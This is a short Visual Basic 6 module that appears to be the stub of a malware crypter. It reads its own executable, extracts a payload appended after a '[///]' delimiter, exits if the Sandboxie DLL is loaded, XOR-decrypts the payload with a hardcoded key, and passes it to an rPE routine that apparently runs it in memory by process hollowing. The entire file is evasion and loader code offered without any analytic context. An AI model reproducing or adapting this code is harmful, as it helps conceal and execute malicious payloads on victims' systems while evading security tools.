Attribute VB_Name = "mMain"
Option Explicit

Const sStr = "[///]"
Const sKEY = "WR$%#$^WR"

Sub Main()

Dim sRd    As String
Dim sSp()  As String
Dim bRn()  As Byte
Dim cE     As New mXOR

    Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #1
    sRd = Space(LOF(1))
    Get #1, , sRd
    Close #1
  
    sSp = Split(sRd, sStr)
    
    If sSp(1) = 1 Then
    If GetModuleHandle("SbieDll.dll") <> 0 Then Exit Sub
    End If
    
    bRn() = cE.DecryptString(sSp(2), sKEY)
      
    rPE App.Path & "\" & App.EXEName & ".exe", StrConv(bRn(), vbFromUnicode)
  
End Sub
